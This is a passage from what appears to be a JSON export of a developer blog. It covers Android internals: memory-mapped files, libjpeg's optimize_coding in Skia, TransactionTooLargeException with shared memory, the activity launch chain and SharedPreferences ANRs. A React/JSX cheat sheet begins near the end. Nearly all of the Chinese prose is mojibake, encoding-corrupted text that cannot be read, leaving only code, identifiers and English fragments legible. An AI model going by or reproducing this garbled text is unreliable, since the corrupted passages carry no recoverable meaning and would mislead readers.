(FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } finally { if (raf != null) { try { raf.close(); } catch (IOException e) { e.printStackTrace(); } } } } } é€šè¿‡FileChannelçš„map(),å¯ä»¥å°†æŒ‡å®šåŒºåŸŸèŒƒå›´çš„æ–‡ä»¶ç›´æ¥è¯»åˆ°å†…å­˜ä¸­ï¼Œè¿”å›MappedByteBufferç±»å‹,è¿™é‡Œç§°ä¹‹ä¸ºå†…å­˜æ˜ å°„.ç„¶åé€šè¿‡MappedByteBufferå–æˆ–å†™å¯¹åº”æ ‡è®°ä½æ•°æ®ã€‚å¦‚ä½•å–å‘¢ï¼Ÿé€šè¿‡memoryMap.get(index) æ¥å–æŒ‡å®šä½ç½®çš„å­—èŠ‚æ•°æ®ï¼Œindexæ ¹æ®æ ‡è®°ä½çš„ä½ç½®æ¥ç¡®è®¤ï¼Œæ¯”å¦‚å‰é¢mFlagçš„æ ‡è®°ä½ä¸ºæ˜¯åœ¨æ–‡ä»¶å¤´å‘ååç§»äº†ä¸€ä¸ª4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¿™é‡Œè¦å–ç›¸åŒçš„å€¼åˆ™æ˜¯è¦ä½¿ç”¨memoryMap.get(4)å³å¯ï¼Œå¦‚æœè¦è®¾ç½®æ ‡è®°ä½çš„å€¼å¯ä»¥ä½¿ç”¨put(index,value)å‡½æ•°ï¼Œä¾‹å¦‚ï¼šmemoryMap.put(4,(byte)1);å…¶å®åœ¨Androidä¸Šå±‚ä¹Ÿå¾ˆç®€å•ï¼Œç›¸å½“äºè¯»æ–‡ä»¶ï¼ŒæŠŠæ–‡ä»¶æè¿°ç¬¦æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œè¿™ç§æ–¹å¼æ¯”æ¯æ¬¡è¿›è¡Œæ–‡ä»¶IOæ“ä½œè‚¯å®šå¿«å¾ˆå¤šã€‚ æƒ³åˆ°ä»€ä¹ˆï¼Ÿ log4jä½¿ç”¨mmmapå°†å†™æ—¥å¿—å˜æˆå¯¹å†…å­˜çš„æ“ä½œ æ—©å°±æœ‰äººè¿™æ ·åšäº† æ³¨æ„çš„æ˜¯ï¼Œå¿«æ˜¯å¿«ï¼Œä½†å¤šçº¿ç¨‹æ“ä½œè¿˜æ˜¯è¦åŠ é”ï¼Œå¤šè¿›ç¨‹æ“ä½œè¿˜æ˜¯è¦ç”¨ä¿¡å·é‡åŒæ­¥ ç±»ä¼¼çš„ä½¿ç”¨mmapçš„åº“è¿˜æœ‰å¾ˆå¤š: mmkv (è…¾è®¯çš„KVå­˜å‚¨),Tokyo Cabinet (æ¯”è¾ƒæ—©çš„ä¸€ä¸ªkvå­˜å‚¨ç³»ç»Ÿ) 23. Androidå›¾ç‰‡è´¨é‡ä¼šæ¯”iPhoneçš„å·®æ˜¯æœ‰åŸå› çš„æ›¿æ¢libjpegåº“å¤§è‡´æ˜¯ï¼ŒAndroidç¼–ç ä¿å­˜å›¾ç‰‡å°±æ˜¯é€šè¿‡Javaå±‚å‡½æ•°â€”â€”Nativeå±‚å‡½æ•°â€”â€”Skiaåº“å‡½æ•°â€”â€”å¯¹åº”ç¬¬ä¸‰æ–¹åº“å‡½æ•°ï¼ˆä¾‹å¦‚libjpegï¼‰ï¼Œè¿™ä¸€å±‚å±‚è°ƒç”¨åšåˆ°çš„ã€‚ libjpegåœ¨å‹ç¼©å›¾åƒæ—¶ï¼Œæœ‰ä¸€ä¸ªå‚æ•°å«optimize_codingï¼Œå¦‚æœè®¾ç½®optimize_codingä¸ºTRUEï¼Œå°†ä¼šä½¿å¾—å‹ç¼©å›¾åƒè¿‡ç¨‹ä¸­åŸºäºå›¾åƒæ•°æ®è®¡ç®—å“ˆå¼—æ›¼è¡¨ï¼Œç”±äºè¿™ä¸ªè®¡ç®—ä¼šæ˜¾è‘—æ¶ˆè€—ç©ºé—´å’Œæ—¶é—´ï¼Œé»˜è®¤å€¼è¢«è®¾ç½®ä¸ºFALSEã€‚å¯¹äºå½“æ—¶çš„è®¡ç®—è®¾å¤‡æ¥è¯´ï¼Œç©ºé—´å’Œæ—¶é—´çš„æ¶ˆè€—å¯èƒ½æ˜¯æ˜¾è‘—çš„ï¼Œä½†åˆ°ä»Šå¤©ï¼Œè¿™ä¼¼ä¹ä¸åº”å†æ˜¯é—®é¢˜ã€‚ä½†è°·æ­Œçš„Skiaé¡¹ç›®å·¥ç¨‹å¸ˆä»¬å¯¹optimize_codingåœ¨Skiaä¸­é»˜è®¤çš„ç­‰äºäº†FALSEï¼Œè¿™å°±æ„å‘³ç€æ›´å·®çš„å›¾ç‰‡è´¨é‡å’Œæ›´å¤§çš„å›¾ç‰‡æ–‡ä»¶ã€‚è¿˜æœ‰å…¶ä»–å’ŒiOSçš„æ¯”è¾ƒå¯ä»¥çœ‹ä¸‹ã€‚ä¹Ÿè®²åˆ°äº†Androidå¯ä»¥æ›¿æ¢libjpegåº“è¾¾åˆ°è®¾ç½®ä¸ºTRUEçš„ç›®çš„ã€‚Androidå›¾ç‰‡ç¼–ç æœºåˆ¶æ·±åº¦è§£æï¼ˆBitmapï¼ŒSkiaï¼ŒlibJpegï¼‰ 24.TransactionTooLargeExceptionçš„åŸå› åŠè§„é¿æ–¹æ¡ˆä½¿ç”¨AndroidSharedMemory å…¶å®ä¹Ÿå°±æ˜¯MemoryFileè¿™ä¸ªclassäº†Android é€šè¿‡åŒ¿åå…±äº«å†…å­˜ä¼ è¾“Parcelableå¯¹è±¡åˆ—è¡¨ TransactionTooLargeExceptionè¿™ä¸ªå¼‚å¸¸ï¼Œè¿™ä¸ªjavaå¼‚å¸¸æ˜¯åœ¨jniå±‚æŠ›å‡ºçš„ï¼Œå¯è§android_util_binder.cppä¸­å…³äºè¿™ä¸ªå¼‚å¸¸çš„è§£é‡Šï¼Œå¤§æ¦‚æ„æ€æ˜¯â€œä¼ è¾“å¤ªå¤§æ˜¯æœ€å¸¸è§çš„åŸåº”ï¼Œä½†æ˜¯ä¸æ˜¯å”¯ä¸€åŸåº”ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯FDï¼Œåº”è¯¥å°±æ˜¯æè¿°binderé©±åŠ¨çš„æ–‡ä»¶ææ˜¯ç¬¦å…³é—­äº†ï¼Œä»¥åŠå¯èƒ½å…¶ä»–åŸå› â€ï¼Œè¿™é‡Œæš‚ä¸”åªå…³æ³¨å¸¸è§çš„ã€‚æˆ‘ä»¬åœ¨ç»„ä»¶é—´é€šä¿¡æ—¶ä¼šä½¿ç”¨intentä¼ è¾“ä¸€äº›å‚æ•°ï¼Œä¸€æ­¥å°å¿ƒä¼šå¸¦ä¸Šä¸€äº›å¤§å¯¹è±¡ï¼Œç»„ä»¶å¯åŠ¨åˆ°åº•å±‚éƒ½ä¼šé€šè¿‡ActivityManagerServiceè¿™ä¸ªå®ˆæŠ¤ç¥ï¼Œå±äºè¿›ç¨‹é—´é€šä¿¡ï¼Œæœ€ç»ˆéƒ½éœ€è¦ä½¿ç”¨Parcelå°†æ•°æ®å†™å…¥å†…æ ¸ä¸­ç”±Binderå¼€è¾Ÿçš„ä¸€å—åŒºåŸŸï¼ŒBinderé©±åŠ¨opençš„åŒºåŸŸä¸€èˆ¬ä¸º4Mï¼Œè€Œè¿›ç¨‹é—´ä¼ è¾“çš„æ•°æ®å¤§å°ä¼šé™åˆ¶åœ¨1Mï¼Œè€Œä¸”è¿™1Mæ˜¯è¢«è¿™ä¸ªè¿›ç¨‹æ‰€æœ‰æ­£åœ¨è¿›è¡Œçš„binderé€šä¿¡æ‰€å…±åŒä½¿ç”¨çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ä¹Ÿå°±è¾¾ä¸åˆ°1Mï¼Œå¯æƒ³è€ŒçŸ¥ï¼Œæˆ‘ä»¬è¦æ˜¯ä¼ ä¸ªBitmapå•¥çš„ï¼Œç¦»å¥”æºƒä¹Ÿå°±ä¸è¿œäº†ã€‚ åŸç†å°±æ˜¯åœ¨ä¸»è¿›ç¨‹é‡Œé¢ä½¿ç”¨MemoryFile(â€œtestâ€,bytearray.length), å¾€è¿™ä¸ªmemoryFileé‡Œé¢å†™bytesï¼Œæå®šä¹‹åé€šè¿‡åå°„æ‹¿åˆ°MemoryFile.getFileDescriptoræ–¹æ³•,invokeè¿™ä¸ªæ–¹æ³•ã€‚ï¼ˆè·å¾—åº•å±‚SharedMemoryåœ¨æœ¬è¿›ç¨‹ä¸­çš„fd,æ³¨æ„ï¼Œè¿™åªæ˜¯ä¸ªIntå€¼ï¼Œå¹¶ä¸”åœ¨å¦ä¸€ä¸ªè¿›ç¨‹ä¸­è¿™ä¸ªintå€¼æ˜¯ä¸ä¸€æ ·çš„ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡binderæŠŠè¿™ä¸ªfdåŒ…è£…æˆParcelFileDescriptorï¼Œä¼ åˆ°remote processä¸­ã€‚ï¼‰remote processåœ¨è¯»å–bytesçš„æ—¶å€™ï¼Œè¯»åˆ°çš„fd çš„intå€¼ä¸ä¸€æ ·ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥æ ¹æ®new FileInputStream(fd)ï¼Œä»ä¸­è¯»å–æŒ‡å®šé•¿åº¦çš„bytes arrayï¼Œ marshallä¸€ä¸‹ï¼Œä¹Ÿå°±èƒ½å¤Ÿåœ¨remote processä¸­åˆ›å»ºåˆšæ‰é‚£ä»½objectçš„å¤‡ä»½äº†ã€‚(api 27ä¹‹åæä¾›äº†sharedMemoryçš„public apiï¼Œè€ŒMemoryFileåˆ™æ˜¯MemoryFileçš„ä¸€å±‚Wrapper)äº²æµ‹ï¼Œè¿™ç§æ–¹å¼å¯ä»¥å†™50MBä»¥ä¸Šçš„byte arrayï¼Œåªæ˜¯bytes[]å¤ªå¤§çš„è¯ï¼Œå†™çš„è¿›ç¨‹ä¼šçœ‹åˆ°å¾ˆå¤šGCæ—¥å¿—ï¼Œæ‰€ä»¥ä¼šæ¯”è¾ƒæ…¢ã€‚è¯»æ•°æ®çš„ä¸€ç«¯ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†ï¼Œä¼šæ…¢ä¸€ç‚¹ã€‚çœ‹ä¸Šå»å°±åƒæ˜¯Aè¿›ç¨‹å¾€ä¸€ä¸ªç³»ç»Ÿå…±äº«çš„å†…å­˜å†™äº†50MBæ•°æ®ï¼Œç„¶åèµ°Binderå‘Šè¯‰Bè¿›ç¨‹è¿™ä¸ªå†…å­˜çš„åœ°å€ï¼Œåè€…è‡ªå·±å»é‚£é‡Œè¯»æ•°æ®å…±äº«å†…å­˜åªè¦è¯»ä¸€æ¬¡ï¼Œå†™ä¸€æ¬¡ï¼Œæ•ˆç‡æœ€é«˜é‡‡ç”¨å…±äº«å†…å­˜é€šä¿¡çš„ä¸€ä¸ªæ˜¾è€Œæ˜“è§çš„å¥½å¤„æ˜¯æ•ˆç‡é«˜ï¼Œå› ä¸ºè¿›ç¨‹å¯ä»¥ç›´æ¥è¯»å†™å†…å­˜ï¼Œè€Œä¸éœ€è¦ä»»ä½•æ•°æ®çš„æ‹·è´ã€‚å¯¹äºåƒç®¡é“å’Œæ¶ˆæ¯é˜Ÿåˆ—ç­‰é€šä¿¡æ–¹å¼ï¼Œåˆ™éœ€è¦åœ¨å†…æ ¸å’Œç”¨æˆ·ç©ºé—´è¿›è¡Œå››æ¬¡çš„æ•°æ®æ‹·è´ï¼Œè€Œå…±äº«å†…å­˜åˆ™åªæ‹·è´ä¸¤æ¬¡æ•°æ®[1]ï¼š1.ä¸€æ¬¡ä»è¾“å…¥æ–‡ä»¶åˆ°å…±äº«å†…å­˜åŒºï¼Œ2.å¦ä¸€æ¬¡ä»å…±äº«å†…å­˜åŒºåˆ°è¾“å‡ºæ–‡ä»¶ã€‚ è‡³å°‘åœ¨6.0çš„Bitmap.cppä»£ç ä¸­è¿˜çœ‹åˆ°parcelå†™bitmapä¼šå°è¯•ä½¿ç”¨åŒ¿åå…±äº«å†…å­˜çš„å½±å­ã€‚å¦‚æœä¸è¡Œæ‰èµ°writeBlobæ–¹æ³•(1MBé™åˆ¶ï¼ŒTransactionTooLargeExceptionæ˜¯jniä¸¢å‡ºæ¥çš„æ–¹æ³•). static jboolean Bitmap_writeToParcel(JNIEnv* env, jobject, jlong bitmapHandle, jboolean isMutable, jint density, jobject parcel) { ... // Transfer the underlying ashmem region if we have one and it&#39;s immutable. android::status_t status; int fd = androidBitmap-&gt;getAshmemFd(); //è¿™é‡Œè·å¾—å…±äº«å†…å­˜ if (fd &gt;= 0 &amp;&amp; !isMutable &amp;&amp; p-&gt;allowFds()) { //allowFdsé»˜è®¤æ˜¯trueçš„ #if DEBUG_PARCEL ALOGD(&quot;Bitmap.writeToParcel: transferring immutable bitmap&#39;s ashmem fd as &quot; &quot;immutable blob (fds %s)&quot;, p-&gt;allowFds() ? &quot;allowed&quot; : &quot;forbidden&quot;); #endif status = p-&gt;writeDupImmutableBlobFileDescriptor(fd); if (status) { doThrowRE(env, &quot;Could not write bitmap blob file descriptor.&quot;); return JNI_FALSE; } return JNI_TRUE; } // Copy the bitmap to a new blob. bool mutableCopy = isMutable; #if DEBUG_PARCEL ALOGD(&quot;Bitmap.writeToParcel: copying %s bitmap into new %s blob (fds %s)&quot;, isMutable ? &quot;mutable&quot; : &quot;immutable&quot;, mutableCopy ? &quot;mutable&quot; : &quot;immutable&quot;, p-&gt;allowFds() ? &quot;allowed&quot; : &quot;forbidden&quot;); #endif size_t size = bitmap.getSize(); android::Parcel::WritableBlob blob; status = p-&gt;writeBlob(size, mutableCopy, &amp;blob); //é€€è€Œæ±‚å…¶æ¬¡ï¼Œä½¿ç”¨writeBlob .... } ä¸è¿‡åæ¥çš„releaseå¥½åƒåˆåˆ æ‰äº†èµ°å…±äº«å†…å­˜è¿™æ®µ 25. activityçš„å¯åŠ¨æµç¨‹æ˜¯æ€æ ·çš„Activity.startActivity Activity.startActivityForResult Instrumentation.execStartActivity ActivityManagerProxy.startActivity --- ActivityManagerService.startActivity ActivityStack.startActivityMayWait ActivityStack.startActivityLocked ActivityStack.startActivityUncheckedLocked ActivityStack.resumeTopActivityLocked ActivityStack.startPausingLocked ApplicationThreadProxy.schedulePauseActivity --- ApplicationThread.schedulePauseActivity ActivityThread.queueOrSendMessage H.handleMessage ActivityThread.handlePauseActivity ActivityManagerProxy.activityPaused --- ActivityManagerService.activityPaused ActivityStack.activityPaused ActivityStack.completePauseLocked ActivityStack.resumeTopActivityLokced ActivityStack.startSpecificActivityLocked ActivityStack.realStartActivityLocked --- ApplicationThreadProxy.scheduleLaunchActivity ApplicationThread.scheduleLaunchActivity ActivityThread.queueOrSendMessage H.handleMessage ActivityThread.handleLaunchActivity ActivityThread.performLaunchActivity *AcitiviyB.onCreate 26. SharedPreferenceçš„applyç”¨å¤šäº†æœ‰ä¸€ä¸ªæ¯”è¾ƒéœ€è¦æ³¨æ„çš„anréšæ‚£(Androidä¸­SharedPreferenceImplä¸­å†™ç£ç›˜æ“ä½œæœ‰ä¸€ä¸ªwrittenToDiskLatch(CountDownLatch)ï¼Œè¿™ä¸ªä¹Ÿæ˜¯SharedPreferenceåœ¨activity onStopæˆ–è€…onPauseä¸­å¯èƒ½å¯¼è‡´anrçš„åŸå› )ç»™çœ‹ä¸€ä¸‹å †æ ˆå°±æ¸…æ¥šäº† &quot;main&quot; prio=5 tid=1 WAIT | group=&quot;main&quot; sCount=1 dsCount=0 obj=0x4155cc90 self=0x41496408 | sysTid=13523 nice=0 sched=0/0 cgrp=apps handle=1074110804 | state=S schedstat=( 2098661082 1582204811 6433 ) utm=165 stm=44 core=0 at java.lang.Object.wait(Native Method) - waiting on &lt;0x4155cd60&gt; (a java.lang.VMThread) held by tid=1 (main) at java.lang.Thread.parkFor(Thread.java:1205) at sun.misc.Unsafe.park(Unsafe.java:325) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:157) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:813) at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:973) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1281) at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:202) at android.app.SharedPreferencesImpl$EditorImpl$1.run(SharedPreferencesImpl.java:364) at android.app.QueuedWork.waitToFinish(QueuedWork.java:88) at android.app.ActivityThread.handleServiceArgs(ActivityThread.java:2689) at android.app.ActivityThread.access$2000(ActivityThread.java:135) at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1494) at android.os.Handler.dispatchMessage(Handler.java:102) at android.os.Looper.loop(Looper.java:137) at android.app.ActivityThread.main(ActivityThread.java:4998) at java.lang.reflect.Method.invokeNative(Native Method) at java.lang.reflect.Method.invoke(Method.java:515) at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:777) at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:593) at dalvik.system.NativeStart.main(Native Method) çœ‹ä¸Šå»åƒæ˜¯SharedPreferencesImpl$EditorImpl$1è¿™ä¸ªclasså µä½äº†ä¸»çº¿ç¨‹è¿™ä¸ªåŒ¿åå†…éƒ¨ç±»å°±å¹²äº†è¿™ä¹ˆä»¶äº‹ï¼Œå µä½äº†ä¸»çº¿ç¨‹ã€‚æ­¤æ—¶HandlerThreadæ­£åœ¨å¿™ç€å†™ç£ç›˜å‘¢ã€‚ final Runnable awaitCommit = new Runnable() { @Override public void run() { try { mcr.writtenToDiskLatch.await();}}} è¿™ç§æƒ…å†µé‡ç°çš„æ–¹å¼æ˜¯ï¼Œåœ¨ä»»æ„çº¿ç¨‹apply 1000æ¬¡ï¼Œç„¶åæŒ‰è¿”å›é”®ã€‚ã€‚ã€‚åº”è¯¥ä¼šæŠŠä¸»çº¿ç¨‹ç»™å µä½ countDownLatchçš„javaDocæ˜¯è¿™ä¹ˆè¯´çš„ï¼šIf the current count is zero then this method returns immediately.If the current count is greater than zero then the current thread becomes disabled for thread scheduling purposes and lies dormant until one of two things happen:The count reaches zero due to invocations of the countDown method; orSome other thread interrupts the current thread.If the current thread:has its interrupted status set on entry to this method; oris interrupted while waiting,then InterruptedException is thrown and the current threadâ€™s interrupted status is cleared. å½“å‰æ•°é‡æ˜¯0çš„è¯ï¼Œç«‹åˆ»è¿”å›ï¼›å¤§äº0 çš„è¯ï¼Œå°±ç­‰åˆ«äººè°ƒç”¨coutDown()æ–¹æ³•æˆ–è€…å…¶ä»–çº¿ç¨‹interruptsè¿™æ¡çº¿ç¨‹ å¦å¤–,The SharedPreferences implementation in Android is thread-safe but not process-safe.(çº¿ç¨‹å®‰å…¨)åŸå› æ˜¯ï¼Œapplyçš„æ—¶å€™æœ‰è¿™ä¹ˆä¸€æ®µ synchronized (SharedPreferencesImpl.this.mLock) { // mMap ï¼Œé¡ºä¾¿è¯´ä¸€ä¸‹,getXXXçš„æ—¶å€™ä¹Ÿè¦ synchronized (mLock) {}ï¼Œæ‰€ä»¥æç«¯æƒ…å†µä¸‹ï¼ŒAçº¿ç¨‹å†™å®Œä¹‹åå»applyåé©¬ä¸Šåˆå»putï¼ˆæ­¤æ—¶è·å¾—äº†mLockï¼Œreadè¿™ä¸€ç«¯å°±çœ‹ä¸åˆ°æœ€æ–°çš„æ•°æ®äº†ï¼‰ //æ‰€è°“çº¿ç¨‹å®‰å…¨å°±æ˜¯è¯»å’Œå†™éƒ½ç”¨äº†ä¸€æŠŠé”ã€‚å¯ä»¥ä¿è¯çš„æ˜¯applyæˆ–è€…commitå¯¹å†…å­˜ä¸­mapè¿›è¡Œå†™æ—¶ï¼Œä»»ä½•è¯•å›¾è¯»çš„çº¿ç¨‹éƒ½ä¼šå› ä¸ºæ‹¿ä¸åˆ°é”è€Œç­‰å¾… } å…³äºsharedPreferenceçš„å·¥ä½œæµç¨‹å˜›ï¼ŒgetXXXçš„æ—¶å€™ä»ä¸€ä¸ªmMapé‡Œé¢getXXX(ç”¨ä¸€ä¸ªmLockåŒ…èµ·æ¥äº†),putxxxçš„æ—¶å€™å°±æ˜¯æ‹¿ç€è¿™æŠŠé”(mLock)ï¼Œå¾€ä¸€ä¸ªmModifiedçš„mapé‡Œä¸¢æ•°æ®ï¼Œapplyçš„æ—¶å€™å…ˆå»commitToMemory(å°±æ˜¯æŠ¢åˆ°è¿™æŠŠé”mLockï¼Œä¸€ä¸ªä¸ªå»å¾€mMapé‡Œé¢æ¯”è¾ƒcontainsKeyï¼Œç„¶åclearè¿™ä¸ªmModified)ã€‚å¦å¤–,mMapæ˜¯åˆ›å»ºçš„æ—¶å€™å°±èµ·äº†ä¸€ä¸ªçº¿ç¨‹ï¼ŒloadFromDiskä¹‹åç”Ÿæˆè¿™ä¸ªmapã€‚å†™ç£ç›˜åˆ†ä¸ºapplyå’Œcommitï¼Œapplyæ˜¯å…ˆcommitToMemoryï¼Œç„¶åenqueueDiskWrite()ã€‚commitåœ¨ç‰¹å®šæƒ…å†µä¸‹ç›´æ¥åœ¨è°ƒç”¨commitçš„çº¿ç¨‹ä¸­å†™ç£ç›˜ï¼Œè¿™ä¸ªç‰¹å®šæƒ…å†µæ˜¯æŒ‡ï¼ˆcï¼ŒmDiskWritesInFlightåœ¨æ¯æ¬¡è°ƒç”¨commitToMemoryä¸­åŠ ä¸€ï¼Œå†™å®Œç£ç›˜åå‡ä¸€ï¼Œæ‰€ä»¥è¿™ç§ç‰¹æ®Šæƒ…å†µä¸€èˆ¬å‡ºç°åœ¨åˆšè°ƒç”¨ä¸€æ¬¡commitä¹‹åï¼Œå°±æ˜¯è¯´ç­‰å¾…åŒæ­¥åˆ°ç£ç›˜ä¸Šçš„å†™æ¬¡æ•°åªæœ‰ä¸€æ¬¡çš„æ—¶å€™å°±ç›´æ¥å†™ç£ç›˜äº†ã€‚ï¼‰å¦åˆ™ç«‹åˆ»ç»™handlerå‘é€ä¸€ä¸ªæ¶ˆæ¯å»å¤„ç†å†™ç£ç›˜ä»»åŠ¡é˜Ÿåˆ— ã€‚ åœ¨commité‡Œé¢ï¼ŒenqueueDiskWriteä¹‹åè°ƒç”¨äº†writtenToDiskLatch.await();ï¼ˆå¦‚æœæ˜¯åŒæ­¥å†™ï¼Œå†™çš„é‡Œé¢å°±é€šè¿‡countDownæŠŠcountå˜æˆ0ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è¿”å›ï¼‰ã€‚å¦‚æœæ˜¯è·‘åˆ°é‚£ä¸ªhandlerThreadé‡Œé¢å»å†™ã€‚enqueueDiskWriteè¿˜æŒ‡å®šäº†ä¸€ä¸ªpostWriteRunnable(å°±æ˜¯countDownï¼Œæ‰€ä»¥è¿™é‡Œä¼šå µä½) è¿™æ ·çœ‹æ¥ï¼Œcommitçš„å µå¡æœ‰ä¸¤ç§å µæ³•ï¼Œä¸€ç§æ˜¯ç›´æ¥åœ¨å½“å‰çº¿ç¨‹åšioå µä½(mDiskWritesInFlight == 1)vï¼Œå¦ä¸€ç§æ˜¯CountDownLatch.await(ç­‰å…¶ä»–çº¿ç¨‹å†™å®Œäº†ä¹‹åcountDownï¼Œè¿™é‡Œçš„çº¿ç¨‹æ‰èƒ½å”¤é†’)ã€‚ HandlerThread handlerThread = new HandlerThread(&quot;queued-work-looper&quot;, Process.THREAD_PRIORITY_FOREGROUND); //è¿™ä¸ªæ˜¯applyé‡Œé¢å†™ç£ç›˜çš„åå°çº¿ç¨‹ å¾€è¿™æ¡HandlerThreadä¸Šæ¨ä»»åŠ¡æ—¶æœ‰å»¶æ—¶(å»¶æ—¶100mså†post)å’Œç«‹åˆ»æ‰§è¡Œ(ç«‹åˆ»postï¼Œç†è®ºä¸Šåº”è¯¥ä¼šå”¤é†’ç­‰å¾…çš„looperï¼Œç®—æ˜¯ç«‹åˆ»æ‰§è¡Œå§)ä¸¤ç§æ–¹å¼ 27. åŠå¤œçœ‹åˆ°ä¸€ç¯‡å…³äºmiuiçš„å¼€å‘è€…æ–‡æ¡£ï¼Œé¡¿æ—¶æ„Ÿè§‰ä¸æ˜¯æ‰€æœ‰çš„é—®é¢˜éƒ½èƒ½é€šè¿‡æŠ€æœ¯æ¥è§£å†³miuiã€‚è¿™é‡Œé¢æè¿°äº†muuiä¸Šå¼€å‘çš„ä¸€äº›é—®é¢˜ï¼šä¾‹å¦‚Q:å¦‚ä½•è·å–æŸé¡¹æƒé™æ˜¯å¦å¼€å¯ï¼ŸA:æš‚æ—¶æ²¡æœ‰è¿™ä¸ªæŸ¥è¯¢æ¥å£ Q:ä¸ºä»€ä¹ˆä¸èƒ½åœ¨é”å±æ˜¾ç¤ºActivity(è¿™ä¸ªæˆ‘è‡ªå·±çœ‹åˆ°çš„æ˜¯ç½‘æ˜“äº‘éŸ³ä¹è¿™ç§ä¹Ÿä¸èƒ½åœ¨miuiä¸Šé”å±)A:MIUIå¼•å…¥äº†é”å±æ˜¾ç¤ºçª—å£æƒé™æ§åˆ¶ï¼Œé»˜è®¤ä¸èƒ½åœ¨é”å±ä¸Šæ˜¾ç¤ºActivity æ—©ä¸€äº›çœ‹åˆ°è¿™æ ·çš„æ–‡æ¡£ï¼Œä¹Ÿä¸è‡³äºæµªè´¹å¤ªå¤šæ—¶é—´å’Œå›½äº§romè¿›è¡Œè°ƒè¯•å§ï¼Œæ²¡æ„æ€çš„ã€‚å½“ç„¶è¿˜æ˜¯è¦çœ‹ä»·å€¼ã€‚ 28. å…³äºandroidä¸­å¦‚ä½•æ”¶é›†native crashçš„é—®é¢˜libcorkscrew ä¸€ç§åŸºäºlinuxä¿¡å·é‡çš„æ”¶é›†crashçš„æ–¹å¼ç”Ÿäº§ç¯å¢ƒè§è¿‡ç”¨çˆ±å¥‡è‰ºçš„ä¸€ä¸ªåº“ å®‰å“æ‰“åŒ…æµç¨‹ 29. MiuiResourcesä¸èƒ½éšä¾¿æ›¿æ¢Resource.getClass().getName().equals(â€œandroid.content.res.MiuiResourcesâ€)çš„æ—¶å€™ï¼ŒContextImplçš„resourceä¸èƒ½æ¢ã€‚","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"Reactè¯­æ³•åŠReduxå®è·µç¬”è®°","date":"2018-03-17T23:56:45.000Z","path":"2018/03/17/2018-03-17-react-cheatSheet/","text":"ä»‹ç»Reactè¯­æ³•åŠä¸€äº›Reduxçš„ä½¿ç”¨æ–¹æ³• Take AwayåŸºæœ¬çš„æµç¨‹å°±æ˜¯åˆ›å»ºä¸€ä¸ªç»§æ‰¿React.Componentçš„classï¼Œè®¾å®šstateï¼Œæ·»åŠ ç‚¹å‡»äº‹ä»¶ã€‚æœ€é‡è¦çš„æ˜¯åœ¨render()å‡½æ•°ä¸­è¿”å›ä¸€ä¸ªelementï¼Œæ¯”å¦‚è¯´è¿™æ · class LoginControl extends React.Component{ constructor(props){ super(props); } const myelement= &lt;button&gt;hello è¿™å°±æ˜¯jsxè¯­æ³• there&lt;/button&gt; return( // &lt;div&gt; // &lt;Greeting isLoggedIn={isLoggedIn}/&gt; // {button} // &lt;/div&gt; myelement // è¿™é‡ŒæŠŠhtml tagæå–åˆ°å¤–é¢ä¹Ÿè¡Œï¼Œå†™åœ¨é‡Œé¢ä¹Ÿè¡Œï¼Œæ··ç€å†™çš„è¯ï¼Œ{myelement}ï¼ŒåŠ ä¸Šå¤§æ‹¬å·å°±æ˜¯äº† // å®˜æ–¹guideä¸Šçš„åŸè¯æ˜¯: You may embed any expressions in JSX by wrapping them in curly braces(å¤§æ‹¬å·). ) } // returné‡Œé¢åªèƒ½è¿”å›ä¸€ä¸ªtag propsæ˜¯åªè¯»çš„ JSX allows embedding any expressions ,å°±æ˜¯è¯´jsxè¯­å¥ä¸­ï¼Œå¤§æ‹¬å·åŒ…èµ·æ¥çš„åœ°æ–¹ï¼Œä»€ä¹ˆjséƒ½èƒ½å†™ å®‰è£… yarn global add create-react-appcreate-react-app my-appcd my-appnpm start ç¨‹åºå…¥å£åœ¨htmlæ–‡ä»¶ä¸­æ·»åŠ è¿™æ ·ä¸€ä¸ªtag &lt;div id=&quot;root&quot;&gt;&lt;/div&gt; åœ¨index.jsä¸­æ·»åŠ è¿™æ ·ä¸€æ®µ const element = &lt;h1&gt;Hello, world&lt;/h1&gt;; ReactDOM.render(element, document.getElementById(&#39;root&#39;)); å¯ä»¥è®¤ä¸ºReactDOM.renderæ–¹æ³•å°±æ˜¯ç¨‹åºçš„å…¥å£ Elementå’ŒComponentçš„æ¦‚å¿µElementæ„Ÿè§‰ä¸Šå°±åƒä¸€ä¸ªæˆ–è€…å¤šä¸ªUIæ§ä»¶çš„é›†åˆ const element = &lt;h1&gt;Hello, world&lt;/h1&gt;; //è¿™å°±ç®—ä¸€ä¸ªElement,ç”¨äºæè¿°å°†è¦å±•ç¤ºåœ¨å±å¹•ä¸Šçš„æ•ˆæœ //æ”¯æŒçº¯å‡½æ•°å¼çš„Component function Welcome(props) { return &lt;h1&gt;Hello, {props.name}&lt;/h1&gt;; } // æˆ–è€…ç”¨es6è¯­æ³• class Welcome extends React.Component { render() { return &lt;h1&gt;Hello, {this.props.name}&lt;/h1&gt;; } } Stateçš„æ›´æ”¹Stateæ˜¯åœ¨constructoré‡Œé¢åˆå§‹åŒ–çš„ï¼Œæƒ³è¦æ›´æ”¹å…¶ä¸­çš„å€¼çš„è¯ï¼Œä¸èƒ½ç›´æ¥èµ‹å€¼ï¼Œéœ€è¦ä½¿ç”¨setStateæ–¹æ³• this.setState({comment: â€˜Helloâ€™}); 